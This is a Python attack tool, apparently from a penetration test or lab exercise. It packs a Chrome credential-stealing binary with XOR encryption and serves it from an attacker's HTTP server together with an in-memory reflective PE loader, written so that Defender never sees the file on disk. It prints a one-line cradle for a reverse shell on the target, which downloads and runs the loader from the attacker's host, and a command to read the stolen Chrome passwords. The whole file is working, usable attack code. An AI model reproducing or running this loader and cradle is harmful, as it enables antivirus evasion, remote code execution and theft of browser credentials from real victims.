#!/usr/bin/env python3
"""Pack xaitax chrome-injector and serve it with an in-memory PE loader.

Defender catches the binary on disk write, so we never touch disk.  Instead
we serve a Python script that uses ctypes to manually map the PE into the
current process memory and call its entry point.

The cmd.exe cradle runs Python on the target to fetch + execute the loader.

Usage:
    python3 serve.py --download   # first time: fetch binary from GitHub
    python3 serve.py              # pack + serve
"""

import argparse
import hashlib
import http.server
import io
import os
import secrets
import struct
import sys
import urllib.request
import zipfile

XAITAX_URL = (
    "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption"
    "/releases/download/v0.20.0/chrome-injector-v0.20.0.zip"
)
BINARY_NAME = "chrome-injector.exe"
DEFAULT_HOST = "192.168.45.205"
DEFAULT_PORT = 9003


def download_binary(dest: str) -> None:
    print(f"[*] Downloading {XAITAX_URL} ...")
    resp = urllib.request.urlopen(XAITAX_URL)
    zdata = resp.read()
    with zipfile.ZipFile(io.BytesIO(zdata)) as zf:
        names = zf.namelist()
        exe = next((n for n in names if "x64" in n.lower() and n.lower().endswith(".exe")), None)
        if exe is None:
            exe = next((n for n in names if n.lower().endswith(".exe")), None)
        if exe is None:
            print(f"[!] No .exe found in zip.  Contents: {names}", file=sys.stderr)
            sys.exit(1)
        data = zf.read(exe)
    with open(dest, "wb") as f:
        f.write(data)
    print(f"[+] Saved {dest} ({len(data)} bytes, sha256={hashlib.sha256(data).hexdigest()[:16]}...)")


def pack(raw: bytes) -> tuple[bytes, bytes]:
    key = secrets.token_bytes(32)
    enc = bytearray(len(raw))
    for i, b in enumerate(raw):
        enc[i] = b ^ key[i % len(key)]
    blob = struct.pack("<I", len(raw)) + bytes(enc)
    return bytes(blob), key


LOADER_TEMPLATE = r'''
import ctypes, ctypes.wintypes, os, struct, sys, urllib.request
os.environ['no_proxy'] = '{host}'

k = bytes([{hex_key}])
url = "http://{host}:{port}/p"

blob = urllib.request.urlopen(url).read()
sz = struct.unpack_from("<I", blob, 0)[0]
pe = bytearray(sz)
for i in range(sz):
    pe[i] = blob[i + 4] ^ k[i % len(k)]

K32 = ctypes.windll.kernel32
NT  = ctypes.windll.ntdll

def P(n):
    return ctypes.c_void_p(n)

K32.VirtualAlloc.restype = ctypes.c_uint64
K32.VirtualAlloc.argtypes = [ctypes.c_uint64, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32]
K32.LoadLibraryA.restype = ctypes.c_uint64
K32.LoadLibraryA.argtypes = [ctypes.c_char_p]
K32.GetProcAddress.restype = ctypes.c_uint64
K32.GetProcAddress.argtypes = [ctypes.c_uint64, ctypes.c_char_p]
NT.RtlMoveMemory.argtypes = [ctypes.c_uint64, ctypes.c_char_p, ctypes.c_size_t]
K32.FlushInstructionCache.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_size_t]
K32.GetModuleHandleA.restype = ctypes.c_uint64
K32.GetModuleHandleA.argtypes = [ctypes.c_char_p]

def u16(buf, off): return struct.unpack_from("<H", buf, off)[0]
def u32(buf, off): return struct.unpack_from("<I", buf, off)[0]
def u64(buf, off): return struct.unpack_from("<Q", buf, off)[0]
def m16(addr): return ctypes.c_uint16.from_address(addr).value
def m32(addr): return ctypes.c_uint32.from_address(addr).value
def m64(addr): return ctypes.c_uint64.from_address(addr).value
def w64(addr, val): ctypes.c_uint64.from_address(addr).value = val

pe_off = u32(pe, 0x3C)
if u16(pe, pe_off + 24) != 0x20B:
    print("[!] Not PE32+"); sys.exit(1)

oh = pe_off + 24
image_size   = u32(pe, oh + 56)
header_size  = u32(pe, oh + 60)
entry_rva    = u32(pe, oh + 16)
image_base   = u64(pe, oh + 24)
num_sections = u16(pe, pe_off + 6)

base = K32.VirtualAlloc(0, image_size, 0x3000, 0x40)
if not base:
    print("[!] VirtualAlloc failed"); sys.exit(1)

NT.RtlMoveMemory(base, bytes(pe[:header_size]), header_size)

sec_off = oh + u16(pe, pe_off + 20)
for i in range(num_sections):
    s = sec_off + i * 40
    va   = u32(pe, s + 12)
    rsz  = u32(pe, s + 16)
    rptr = u32(pe, s + 20)
    if rsz > 0 and rptr > 0:
        NT.RtlMoveMemory(base + va, bytes(pe[rptr:rptr + rsz]), rsz)

delta = base - image_base
reloc_rva  = u32(pe, oh + 112 + 5 * 8)
reloc_size = u32(pe, oh + 112 + 5 * 8 + 4)
if delta != 0 and reloc_rva > 0 and reloc_size > 0:
    pos = 0
    while pos < reloc_size:
        block_rva  = m32(base + reloc_rva + pos)
        block_size = m32(base + reloc_rva + pos + 4)
        if block_size == 0:
            break
        for j in range((block_size - 8) // 2):
            entry = m16(base + reloc_rva + pos + 8 + j * 2)
            if entry >> 12 == 10:
                addr = base + block_rva + (entry & 0xFFF)
                w64(addr, m64(addr) + delta)
        pos += block_size

import_rva = u32(pe, oh + 112 + 1 * 8)
if import_rva > 0:
    imp = 0
    while True:
        ilt_rva  = m32(base + import_rva + imp)
        name_rva = m32(base + import_rva + imp + 12)
        iat_rva  = m32(base + import_rva + imp + 16)
        if name_rva == 0:
            break
        dll_name = ctypes.string_at(base + name_rva)
        hmod = K32.LoadLibraryA(dll_name)
        t_rva = ilt_rva if ilt_rva else iat_rva
        iat_off = 0
        while True:
            thunk = m64(base + t_rva + iat_off)
            if thunk == 0:
                break
            if thunk & (1 << 63):
                proc = K32.GetProcAddress(hmod, thunk & 0xFFFF)
            else:
                fn = ctypes.string_at(base + (thunk & 0x7FFFFFFF) + 2)
                proc = K32.GetProcAddress(hmod, fn)
            w64(base + iat_rva + iat_off, proc if proc else 0)
            iat_off += 8
        imp += 20

K32.FlushInstructionCache(ctypes.c_uint64(-1).value, base, image_size)

# Register exception handling tables (.pdata) so SEH/C++ exceptions work
exc_rva  = u32(pe, oh + 112 + 3 * 8)
exc_size = u32(pe, oh + 112 + 3 * 8 + 4)
if exc_rva and exc_size:
    NT.RtlAddFunctionTable.restype = ctypes.c_bool
    NT.RtlAddFunctionTable.argtypes = [ctypes.c_uint64, ctypes.c_uint32, ctypes.c_uint64]
    NT.RtlAddFunctionTable(base + exc_rva, exc_size // 12, base)

# Patch command line at every level so the PE sees our argv.
# 1) GetCommandLineW/A buffer (kernel32 internal, NOT the PEB)
# 2) PEB ProcessParameters.CommandLine
# 3) CRT __argc/__argv/__wargv (shared ucrtbase.dll)
cmd_line = r"{cmd_args}"
_argv = cmd_line.split()
_argc = len(_argv)
_FN = ctypes.CFUNCTYPE(ctypes.c_uint64)

# --- 1) Patch the buffers returned by GetCommandLineW/A ---
K32.GetCommandLineW.restype = ctypes.c_uint64
K32.GetCommandLineA.restype = ctypes.c_uint64
wptr = K32.GetCommandLineW()
aptr = K32.GetCommandLineA()
new_w = cmd_line.encode("utf-16-le") + b"\x00\x00"
new_a = cmd_line.encode() + b"\x00"
if wptr:
    ctypes.memmove(wptr, new_w, len(new_w))
if aptr:
    ctypes.memmove(aptr, new_a, len(new_a))

# --- 2) Patch PEB ProcessParameters.CommandLine ---
class PBI(ctypes.Structure):
    _fields_ = [("R1", ctypes.c_uint64), ("PebBase", ctypes.c_uint64),
                 ("R2", ctypes.c_uint64 * 2), ("Pid", ctypes.c_uint64), ("R3", ctypes.c_uint64)]
pbi = PBI()
NT.NtQueryInformationProcess(ctypes.c_uint64(0xFFFFFFFFFFFFFFFF), 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
params = m64(pbi.PebBase + 0x20)
buf_ptr = m64(params + 0x78)
ctypes.memmove(buf_ptr, new_w, len(new_w))
ctypes.c_uint16.from_address(params + 0x70).value = len(new_w) - 2

# --- 3) Patch CRT argc/argv ---
ucrt = K32.GetModuleHandleA(b"ucrtbase.dll")
if not ucrt:
    ucrt = K32.GetModuleHandleA(b"msvcrt.dll")
if ucrt:
    _pa = K32.GetProcAddress(ucrt, b"__p___argc")
    _pv = K32.GetProcAddress(ucrt, b"__p___argv")
    _pw = K32.GetProcAddress(ucrt, b"__p___wargv")
    if _pa:
        ctypes.c_int.from_address(_FN(_pa)()).value = _argc
    if _pv:
        tsz = sum(len(a) + 1 for a in _argv)
        abuf = K32.VirtualAlloc(0, (_argc + 1) * 8 + tsz, 0x3000, 0x04)
        off = (_argc + 1) * 8
        for i, a in enumerate(_argv):
            s = a.encode() + b"\x00"
            NT.RtlMoveMemory(abuf + off, s, len(s))
            ctypes.c_uint64.from_address(abuf + i * 8).value = abuf + off
            off += len(s)
        ctypes.c_uint64.from_address(abuf + _argc * 8).value = 0
        ctypes.c_uint64.from_address(_FN(_pv)()).value = abuf
    if _pw:
        tsz = sum((len(a) + 1) * 2 for a in _argv)
        wbuf = K32.VirtualAlloc(0, (_argc + 1) * 8 + tsz, 0x3000, 0x04)
        off = (_argc + 1) * 8
        for i, a in enumerate(_argv):
            s = a.encode("utf-16-le") + b"\x00\x00"
            NT.RtlMoveMemory(wbuf + off, s, len(s))
            ctypes.c_uint64.from_address(wbuf + i * 8).value = wbuf + off
            off += len(s)
        ctypes.c_uint64.from_address(wbuf + _argc * 8).value = 0
        ctypes.c_uint64.from_address(_FN(_pw)()).value = wbuf

K32.GetCommandLineW.restype = ctypes.c_wchar_p
sys.stdout.write(f"[+] Cmdline patched ({_argc} args) -> {K32.GetCommandLineW()}\n")
sys.stdout.flush()
sys.stderr.flush()

ENTRY = ctypes.CFUNCTYPE(ctypes.c_int)
try:
    ENTRY(base + entry_rva)()
except Exception as e:
    sys.stdout.write(f"[!] {e}\n")
    sys.stdout.flush()
'''


def main():
    parser = argparse.ArgumentParser(description="Pack + serve chrome-injector (in-memory)")
    parser.add_argument("--download", action="store_true", help="Download binary from GitHub")
    parser.add_argument("--host", default=DEFAULT_HOST, help="Advertised host for cradle URL")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="HTTP listen port")
    parser.add_argument("--args", default=r"chromelevator.exe -v -o C:\Users\Public\output chrome", help="Command line the PE sees")
    args = parser.parse_args()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    bin_path = os.path.join(script_dir, BINARY_NAME)

    if args.download:
        download_binary(bin_path)

    if not os.path.isfile(bin_path):
        print(f"[!] {BINARY_NAME} not found in {script_dir}", file=sys.stderr)
        print(f"    Run with --download, or place the binary here manually.", file=sys.stderr)
        sys.exit(1)

    with open(bin_path, "rb") as f:
        raw = f.read()
    print(f"[*] Loaded {BINARY_NAME} ({len(raw)} bytes)")

    blob, key = pack(raw)
    print(f"[+] Packed blob: {len(blob)} bytes (key={key[:8].hex()}...)")

    hex_key = ",".join(f"0x{b:02X}" for b in key)
    loader_code = LOADER_TEMPLATE.replace("{hex_key}", hex_key)\
                                  .replace("{host}", args.host)\
                                  .replace("{port}", str(args.port))\
                                  .replace("{cmd_args}", args.args)

    cradle = (
        f'"C:\\Program Files\\Python312\\python.exe" -c '
        f'"import os;os.environ[\'no_proxy\']=\'{args.host}\';'
        f'import urllib.request;exec(urllib.request.urlopen('
        f"'http://{args.host}:{args.port}/loader').read())\""
    )

    print(f"\n[*] Paste this into the reverse shell:\n")
    print(cradle)
    print(f"\n[*] If successful, grab credentials with:")
    print(f"    type C:\\Users\\Public\\output\\Chrome\\Default\\passwords.json")
    print()

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/p":
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Length", str(len(blob)))
                self.end_headers()
                self.wfile.write(blob)
            elif self.path == "/loader":
                body = loader_code.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, fmt, *a):
            print(f"  [{self.client_address[0]}] {fmt % a}")

    print(f"[*] Serving on 0.0.0.0:{args.port} ...")
    print(f"    /p      -> packed PE ({len(blob)} bytes)")
    print(f"    /loader -> Python PE loader ({len(loader_code)} bytes)")
    http.server.HTTPServer(("0.0.0.0", args.port), Handler).serve_forever()


if __name__ == "__main__":
    main()
